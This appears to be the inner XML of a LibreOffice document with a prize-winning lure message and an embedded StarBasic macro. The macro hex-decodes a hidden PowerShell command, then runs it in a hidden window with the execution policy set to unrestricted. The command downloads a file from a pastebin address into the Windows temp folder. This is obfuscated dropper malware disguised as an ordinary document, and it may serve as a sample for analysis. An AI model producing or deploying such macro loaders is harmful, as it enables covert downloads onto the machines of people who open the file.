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heyther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1000000E121FA8E5ED7EAC7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de42e" officeooo:paragraph-rsid="000de4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frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:x="0.109cm" svg:y="0cm" svg:width="17.298cm" svg:height="17.298cm" draw:z-index="0"><draw:image xlink:href="Pictures/10000000000000E1000000E121FA8E5ED7EAC76D.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame>Congratulation, you just got a priz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8T23:04:22.168223441</meta:creation-date>
    <dc:date>2021-09-28T23:47:26.565147316</dc:date>
    <meta:editing-duration>PT2M8S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.1.6.2.0$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="6" meta:character-count="37" meta:non-whitespace-character-count="32"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/heythere.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="heythere" script:language="StarBasic" script:moduleType="normal">Sub Main
	Dim command
	command = "28-6e-65-77-2d-6f-62-6a-65-63-74-20-53-79-73-74-65-6d-2e-4e-65-74-2e-57-65-62-43-6c-69-65-6e-74-29-2e-44-6f-77-6e-6c-6f-61-64-66-69-6c-65-28-27-68-74-74-70-73-3a-2f-2f-70-61-73-74-65-62-69-6e-2e-63-6f-6d-2f-37-58-7a-45-50-38-6d-44-27-2c-20-27-43-3a-5c-77-69-6e-64-6f-77-73-5c-74-65-6d-70-5c-68-61-63-6b-65-72-6d-61-6e-2e-74-78-74-27-29"
	command = Split(command,"-")
	Dim len
	len = UBound(command)
	Dim ps_cmd
	For E = 0 To len
		Dim arr_val
		Dim chr_val
		arr_val = command(E)
		chr_val = ChrW(arr_val)
		ps_cmd = ps_cmd &amp; chr_val
	Next
	ps_cmd = "unrestricted -Command " &amp; ps_cmd
	ps_cmd = "powershell -NoProfile -ExecutionPolicy" &amp; ps_cmd
	Call Shell(ps_cmd, 0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heyther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